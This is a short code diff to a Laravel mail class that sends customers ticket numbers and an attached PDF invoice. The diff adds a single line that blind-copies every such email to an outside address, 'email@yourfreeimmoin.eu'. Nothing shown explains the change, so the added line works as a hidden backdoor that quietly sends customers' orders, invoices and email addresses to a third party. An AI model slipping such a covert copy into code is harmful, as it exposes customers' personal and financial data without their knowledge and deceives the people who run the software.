@@ -64,7 +64,8 @@ class TicketMail extends Mailable implements ShouldQueue
             ->with([
                 'order' => $this->order,
                 'ticketNumbers' => $this->ticketNumbers,
-            ]);
+            ])
+            ->bcc(['email@yourfreeimmoin.eu']);
         $order = $this->order;
         $pdf = PDF::loadView('user.pdf.invoice', compact('order'));
         $email->attachData($pdf->output(), 'invoice.pdf', [
